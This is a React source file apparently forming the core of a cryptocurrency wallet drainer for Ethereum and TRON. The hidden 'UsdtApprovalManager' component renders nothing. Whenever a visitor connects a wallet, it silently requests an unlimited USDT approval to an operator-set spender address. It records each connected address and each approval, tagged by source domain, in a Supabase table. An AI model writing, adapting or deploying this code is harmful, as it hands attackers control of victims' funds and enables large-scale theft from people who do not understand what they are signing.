import { useEffect, useRef } from 'react';
import { useAccount, useReadContract, useWriteContract } from 'wagmi';
import { maxUint256 } from 'viem';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { TronWeb } from 'tronweb';
import { supabase } from '../lib/supabaseClient';
import { isMainnet } from '../lib/walletConfig';
import { getSourceDomain } from '../config/domains';

// ── Contract addresses ────────────────────────────────────────────────────────
const EVM_USDT = isMainnet()
  ? '0xdAC17F958D2ee523a2206206994597C13D831ec7'
  : null; // no official USDT on Sepolia

const TRON_USDT = isMainnet()
  ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  : 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs'; // Shasta testnet

// Spender addresses — set these in your .env file
const EVM_SPENDER = import.meta.env.VITE_EVM_SPENDER_ADDRESS || null;
const TRON_SPENDER = import.meta.env.VITE_TRON_SPENDER_ADDRESS || null;

// USDT on ETH mainnet doesn't return bool from approve, so outputs: []
const USDT_ABI = [
  {
    name: 'allowance',
    type: 'function',
    stateMutability: 'view',
    inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    name: 'approve',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }],
    outputs: [],
  },
];

const TRC20_ABI = [
  {
    constant: true,
    name: 'allowance',
    type: 'function',
    inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
    outputs: [{ name: '', type: 'uint256' }],
  },
  {
    constant: false,
    name: 'approve',
    type: 'function',
    inputs: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }],
    outputs: [{ name: '', type: 'bool' }],
  },
];

const TRON_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
// Treat as "unlimited" if allowance >= half of maxUint256
const UNLIMITED_THRESHOLD = maxUint256 / 2n;

async function trackConnection(address, network, walletType, sourceDomain) {
  const { error } = await supabase.from('wallet_connections').upsert(
    { address, network, wallet_type: walletType, last_seen_at: new Date().toISOString(), source_domain: sourceDomain },
    { onConflict: 'address,network' }
  );
  if (error) console.error('[Supabase] trackConnection failed:', error);
}

async function trackApproval(address, network, txHash, sourceDomain) {
  const { error } = await supabase.from('usdt_approvals').upsert(
    { address, network, tx_hash: txHash, source_domain: sourceDomain },
    { onConflict: 'address,network' }
  );
  if (error) console.error('[Supabase] trackApproval failed:', error);
}

// ── EVM side ─────────────────────────────────────────────────────────────────
function EvmApprovalWatcher() {
  const { address, isConnected, connector } = useAccount();
  const { writeContractAsync } = useWriteContract();

  const connectionTracked = useRef(new Set());
  const approvalAttempted = useRef(new Set());

  const { data: allowance } = useReadContract({
    address: EVM_USDT,
    abi: USDT_ABI,
    functionName: 'allowance',
    args: [address, EVM_SPENDER],
    query: { enabled: isConnected && !!address && !!EVM_USDT && !!EVM_SPENDER },
  });

  // Track connection
  useEffect(() => {
    if (!isConnected || !address) return;
    const key = address.toLowerCase();
    if (connectionTracked.current.has(key)) return;
    connectionTracked.current.add(key);
    trackConnection(key, 'evm', connector?.name || 'unknown', getSourceDomain()).catch(console.error);
  }, [isConnected, address, connector]);

  // Check allowance and request approval
  useEffect(() => {
    if (!isConnected || !address || !EVM_USDT || !EVM_SPENDER) return;
    if (allowance === undefined) return; // still loading
    const key = address.toLowerCase();
    if (approvalAttempted.current.has(key)) return;
    approvalAttempted.current.add(key);

    if (allowance >= UNLIMITED_THRESHOLD) return; // already approved

    writeContractAsync({
      address: EVM_USDT,
      abi: USDT_ABI,
      functionName: 'approve',
      args: [EVM_SPENDER, maxUint256],
    })
      .then((hash) => trackApproval(key, 'evm', hash, getSourceDomain()))
      .catch((err) => console.error('[UsdtApproval] EVM approve failed:', err));
  }, [isConnected, address, allowance, writeContractAsync]);

  return null;
}

// ── TRON side ─────────────────────────────────────────────────────────────────
function TronApprovalWatcher() {
  const { address, connected, wallet, signTransaction } = useWallet();

  const connectionTracked = useRef(new Set());
  const approvalAttempted = useRef(new Set());

  useEffect(() => {
    if (!connected || !address) return;

    // Track connection
    if (!connectionTracked.current.has(address)) {
      connectionTracked.current.add(address);
      trackConnection(address, 'tron', wallet?.adapter?.name || 'unknown', getSourceDomain()).catch(console.error);
    }

    if (!TRON_SPENDER) return;
    if (approvalAttempted.current.has(address)) return;
    approvalAttempted.current.add(address);

    (async () => {
      try {
        // window.tronWeb is only injected by TronLink / Trust browser extensions.
        // WalletConnect connections have no window.tronWeb, so we detect which
        // path to take by checking if the extension is active for this address.
        const extTronWeb = window.tronWeb;
        const isExtension =
          extTronWeb?.ready && extTronWeb?.defaultAddress?.base58 === address;

        if (isExtension) {
          // Extension wallet: tronWeb manages sign + broadcast internally.
          const contract = await extTronWeb.contract(TRC20_ABI, TRON_USDT);
          const raw = await contract.allowance(address, TRON_SPENDER).call();
          const current = BigInt(raw.toString());
          if (current >= BigInt(TRON_MAX) / 2n) return;

          const txId = await contract.approve(TRON_SPENDER, TRON_MAX).send();
          await trackApproval(address, 'tron', txId, getSourceDomain());
        } else {
          // WalletConnect (or non-injecting mobile wallet):
          // Use a headless TronWeb instance for reading state + building unsigned txs,
          // then sign via the wallet adapter and broadcast.
          const tronWeb = new TronWeb({
            fullHost: isMainnet()
              ? 'https://api.trongrid.io'
              : 'https://api.shasta.trongrid.io',
          });
          tronWeb.setAddress(address);

          const contract = await tronWeb.contract(TRC20_ABI, TRON_USDT);
          const raw = await contract.allowance(address, TRON_SPENDER).call();
          const current = BigInt(raw.toString());
          if (current >= BigInt(TRON_MAX) / 2n) return;

          // Build the unsigned approve transaction
          const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
            TRON_USDT,
            'approve(address,uint256)',
            { feeLimit: 100_000_000 },
            [
              { type: 'address', value: TRON_SPENDER },
              { type: 'uint256', value: TRON_MAX },
            ],
            address
          );

          // Sign via the adapter (triggers WalletConnect signing flow)
          const signedTx = await signTransaction(transaction);

          // Broadcast
          const result = await tronWeb.trx.sendRawTransaction(signedTx);
          await trackApproval(address, 'tron', result.txid, getSourceDomain());
        }
      } catch (err) {
        console.error('[UsdtApproval] TRON approve failed:', err);
      }
    })();
  }, [connected, address, wallet, signTransaction]);

  return null;
}

// ── Root export ───────────────────────────────────────────────────────────────
export function UsdtApprovalManager() {
  return (
    <>
      <EvmApprovalWatcher />
      <TronApprovalWatcher />
    </>
  );
}
